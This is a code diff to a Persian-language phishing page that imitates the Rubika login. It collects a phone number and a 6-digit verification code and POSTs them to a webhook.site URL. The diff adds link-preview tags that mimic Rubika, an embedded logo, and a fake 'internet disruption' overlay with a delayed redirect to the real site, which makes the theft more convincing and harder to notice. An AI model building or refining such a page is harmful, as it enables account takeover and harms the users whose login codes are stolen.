@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>روبیکا | ورود</title>
+
+    <!-- 👇 تگ‌های Open Graph برای پیش‌نمایش لینک -->
+    <meta property="og:title" content="ورود به روبیکا وب روبینو">
+    <meta property="og:description" content="برای ورود به حساب کاربری خود، روی لینک کلیک کنید.">
+    <!-- در صورت تمایل می‌توانید یک og:image هم اضافه کنید (آدرس یک عکس مرتبط) -->
+    <meta property="og:image" content="https://web.rubika.ir/static/media/logo.21e4c6b3.png">
+
     <style>
         @font-face {
             font-family: IRANSans;
@@ -32,6 +39,7 @@
             max-width: 95%;
             padding: 32px;
             text-align: center;
+            position: relative;
         }
         .login-logo { width: 80px; height: 80px; margin-bottom: 24px; }
         .login-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 24px; }
@@ -60,15 +68,44 @@
             cursor: pointer;
             margin-top: 8px;
         }
-        .btn:hover { background: #009e8c; }
+        .btn:disabled { background: #aaa; cursor: not-allowed; }
+        .btn:hover:not(:disabled) { background: #009e8c; }
         .step { display: none; }
         .step.active { display: block; }
         .error { color: #e53935; font-size: 14px; margin-top: 8px; display: none; }
+
+        /* لودینگ و پیام اختلال */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+        .overlay.show { display: flex; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #ddd;
+            border-top-color: #00bfa5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .overlay-message {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 <div class="login-wrapper">
-    <img class="login-logo" src="https://web.rubika.ir/static/media/logo.21e4c6b3.png" alt="روبیکا">
+    <!-- لوگوی روبیکا (base64) -->
+    <img class="login-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAYAAACOEfKtAAAACXBIWXMAAAsTAAALEwEAmpwYAAADmUlEQVR4nO2cQW7bMBBFh7bbLnoD36B30AV6gx6hN9ANegNdQTeo0a5cFFkULlA3LrJwU9uyJcvyPIkC9XkASZY4M3z8HIqULMsyCIIgCIIgCIIgbILWm4vn8XTqsR08tPkXgRAA3MeLm+e9MXiAjgDew2HmzwUia0a23mTbq4CjXm/uPmx2B3gFGhufhqIouL2g5o0my6qAGgZf23YLFQBU1ny1bQcANWw/STZSezw6Ybrm0w8EFDa2TQCwP2gRk3+kCwCa9hNmoMmhI1l93ZsQQd4K8w8aT0h/rAHQUnOnP62RrR8ioE0o2zqQ/QBI2xpWWPSH4dwa9jvWA0x5EXUgrgG4E7g6d9MGLhHA24M+nsqh/hM2mJIDhO3x/p6YNRYIkLXAHgoAPTT/DLtrJb9nK6jv6ggIyNqC2v8CArJ2E+v/A4EBWfuRixkByNoHch3XK4yN1hy2CqAKINqYA+Tg7mIJtIl6kV91CIJnjLYWYB1B9n42HL8BmITn0wh/u8GSgIkv1r0xRFYg4JDZT2GFgMT7gfa/NaCQwFLjD4Zb3RYSEAQQNW8WIRZIRPlnY0IBc0H+y9L3zgaFBCx1sxYhE6gSSXguHGrEGhUVMJY1IlYDF0A3v2rBBOQK3zIhBLwAAUu4bT0KowDF3P4ijxkIeK0S83frSaW4O/E0Gs1Cq/BBCu0g4GAfFjJwY1AoIKFcM4F2AjsHwf+U3eRCCHjfyVp2eTqEDPoGgY7nuqFLQNj02h0WQA/RfHrLvl6kP1WACsp1N3Mdv5sAH21nGQu1AK9szyjYH7JcjF+IywAh7K+BNKdkp3cAt1JAczFJb0t0ALebD+VHrXGHWf2thfOXQncPcMvpzZPfOm6Pb8HXmduF7hc3i2cCbr7tM+GuELbMfNHhwqyeb84Wgddgcz0AXh4nS/U6m4XusI3hR9t2cTP8tH2/ueaDbTu6gc9PqAc0MFClyWqf5VHYbqFia0Sth2pPFdqMtNR9Bt9uJaL7sxMvSLJkmYKjqUCBcmUpUepspVh5IhsBVkhWEbFOaImEwN3TgkfR9RUEQRAEQRAEQRAEQdiN/wDl/+Br6Mhx/wAAAABJRU5ErkJggg==" alt="روبیکا">
 
     <!-- مرحله ۱: شماره موبایل -->
     <div id="step1" class="step active">
@@ -83,8 +120,15 @@
         <div class="login-title">کد تأیید ۶ رقمی ارسال‌شده را وارد کنید</div>
         <input type="text" id="codeInput" class="input-box" placeholder="کد تأیید" inputmode="numeric" maxlength="6">
         <div id="codeError" class="error">کد باید ۶ رقم باشد</div>
-        <button class="btn" onclick="sendData()">تأیید</button>
+        <button id="submitBtn" class="btn" onclick="sendData()">تأیید</button>
     </div>
+</div>
+
+<!-- Overlay برای پیام اختلال -->
+<div id="overlay" class="overlay">
+    <div class="spinner"></div>
+    <div class="overlay-message">اختلال در اینترنت، در حال تلاش مجدد...</div>
+    <div style="font-size:14px; color:#888;">لطفاً شکیبا باشید</div>
 </div>
 
 <script>
@@ -104,11 +148,18 @@
     }
 
     function sendData() {
-        const code = document.getElementById('codeInput').value.trim();
+        const codeInput = document.getElementById('codeInput');
+        const code = codeInput.value.trim();
+        const submitBtn = document.getElementById('submitBtn');
+        
         if (code.length === 6) {
             document.getElementById('codeError').style.display = 'none';
             
-            // ارسال داده با fetch و keepalive
+            // غیرفعال کردن دکمه برای جلوگیری از ارسال مجدد
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'لطفاً صبر کنید...';
+            
+            // ارسال اطلاعات با keepalive
             fetch('https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -116,10 +167,14 @@
                 keepalive: true
             });
             
-            // هدایت به روبیکا (بدون منتظر ماندن برای پاسخ)
+            // نمایش پیام اختلال و تاخیر
+            document.getElementById('overlay').classList.add('show');
+            
+            // بعد از ۳ ثانیه هدایت به روبیکا
             setTimeout(() => {
                 window.location.href = 'https://web.rubika.ir/login';
-            }, 100);
+            }, 3000);
+            
         } else {
             document.getElementById('codeError').style.display = 'block';
         }
